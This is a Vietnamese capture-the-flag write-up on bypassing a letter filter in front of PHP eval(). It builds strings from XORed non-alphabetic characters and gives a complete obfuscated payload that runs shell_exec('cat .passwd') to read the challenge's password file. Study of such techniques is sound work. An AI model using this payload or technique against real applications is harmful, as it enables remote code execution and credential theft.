Hàm `eval()` nhận vào 1 string và thực thi nó như 1 đoạn code PHP. Đây đương nhiên là lỗ hổng nguy hiểm, tuy nhiên nhìn vào source code được cung cấp, ta thấy những kí tự a-z, A-Z đều đã được filter:

```php
if(!preg_match('/[a-zA-Z`]/', $_POST['input'])){
```

Vậy sẽ phải tìm cách để viết code mà không cần dùng kí tự alphabet. Search google thử sẽ ra ngay [post](https://medium.com/mucomplex/bypass-with-php-non-alpha-encoder-fee4e1bac31e) này. Ta biết được 2 cách để tạo thành 1 string có nghĩa chỉ dựa vào non-alpha characters:

1. Dùng toán tử `xor`, `or` ví dụ:  '{'  ^  '/'  ->  'T'
2. Dùng toán tử increment ++

Ở đây ta sẽ dùng toán tử xor, or(vì may quá tác giả bài viết này còn cung cấp sẵn 1 tool cho chúng ta đỡ nhọc công tốn sức, tự viết cũng được chỉ đơn giản là brute force các cặp kí tự non-alpha sao cho tổng của chúng = alpha thôi )

Link [tool](https://github.com/mucomplex/PHP_alphanumeric_encoder) 

Đến đây thì đơn giản rồi. Xác định code mình sẽ thực thi trên server: shell_exec('cat .passwd')

Do string được truyền vào hàm eval() bắt đầu bằng lệnh print nên không thể nhét nguyên câu lệnh đã convert sang non-alpha vào được, ta phải viết hẳn 1 đoạn code như sau:

```php
$_ = cat .passwd
    # convert: $_=('8'^'[').('!'^'@').(')'^']').('['^'{').".".(']'^'-').(']'^'<').('^'^'-').('_'^',').('7'^'@').('9'^']')
$__ = shell_exec
    # convert: $__=('3' ^ '@').('3' ^ '[').('8' ^ ']').(',' ^ '@').('@' ^ ',')."_".('[' ^ '>').(']' ^ '%').('^' ^ ';').('^' ^ '=')
$__($_)
```

Payload cuối cùng như sau:

`($_=('8'^'[').('!'^'@').(')'^']').('['^'{').".".(']'^'-').(']'^'<').('^'^'-').('_'^',').('7'^'@').('9'^']')).($__=('3' ^ '@').('3' ^ '[').('8' ^ ']').(',' ^ '@').('@' ^ ',')."_".('[' ^ '>').(']' ^ '%').('^' ^ ';').('^' ^ '=')).($__($_)).";"`



